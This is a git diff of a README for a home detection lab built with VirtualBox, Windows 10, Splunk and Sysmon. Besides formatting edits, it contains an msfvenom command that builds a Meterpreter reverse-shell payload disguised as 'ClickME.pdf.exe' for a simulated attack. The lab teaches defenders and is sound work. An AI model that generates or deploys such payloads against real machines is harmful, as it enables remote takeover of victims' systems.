@@ -9,6 +9,7 @@ The Windows 10 machine utilizes Splunk to ingest logs to identify malicious traf
 - [Implementing Splunk](#Implementing-Splunk)
 - [Configuring Sysmon](#Configuring-Sysmon)
 - [Conducting the simulated attack](#Conducting-the-simulated-attack)
+- [Analyzing the attack](#Analyzing-the-attack) 
 
 
 ## Setting up VirtualBox
@@ -33,7 +34,7 @@ This Lab utilizes Virtual Box as our hypervisor
 ```Bash
 .\MediaCreationTool_22H2.exe /Eula Accept /Retail /MediaArch x64 /MediaLangCode en-US /MediaEdition Enterprise
 ```
-* Note: in the video, the edition of the Media Creation Tool is different, you can simply change the verion (e.g 22H2), and the script will execute
+  * Note: in the video, the edition of the Media Creation Tool is different, you can simply change the verion (e.g 22H2), and the script will execute
 
 * In powershell as Administrator, navigate to the directory using the **cd** command in which you downloaded the media creation tool in
  <img width="962" height="263" alt="image" src="https://github.com/user-attachments/assets/242bf9ed-6c91-4006-ae91-f5676c35d159" />
@@ -51,7 +52,7 @@ This Lab utilizes Virtual Box as our hypervisor
 * Above is a screenshot that demonstrates the successful creation of a Windows 10 ISO for our machine
 
 * Now we are able to add the ISO to VirtualBox and create our Windows 10 client, I chose a generic name for our Business User
-* Note: I skipped the unattended installation
+  * Note: I skipped the unattended installation
 <img width="1736" height="407" alt="image" src="https://github.com/user-attachments/assets/1e834947-aed4-4c1b-8a60-3508a19d9c5f" />
 
 * For the Windows VM, I have pre-allocated 4 GB of RAM, as well as 150 GB of space for the VM
@@ -218,7 +219,7 @@ This Lab utilizes Virtual Box as our hypervisor
 * This payload connects the attacker's machine to the victim's machine, and creates a reverse shell, allowing the attack remote code capability
 * The following command string was used to create our payload
   ```
-  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.190.128 lport=443 -f exe -o       ClickME.pdf.exe
+  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.190.128 lport=443 -f exe -o  ClickME.pdf.exe
   ```
 
 * This command creates our reverse shell using our kali machine as the local host, as well as using HTTPS (Port 443) as the local port. It also creates an executable file that contains two file extensions
@@ -226,6 +227,8 @@ This Lab utilizes Virtual Box as our hypervisor
 *  We can verify the file was creating using **ls**
   <img width="572" height="76" alt="image" src="https://github.com/user-attachments/assets/ae23d5e1-7cc2-4052-b053-ac6d633cb960" />
 
+
+# Analyzing the attack 
        
 
 
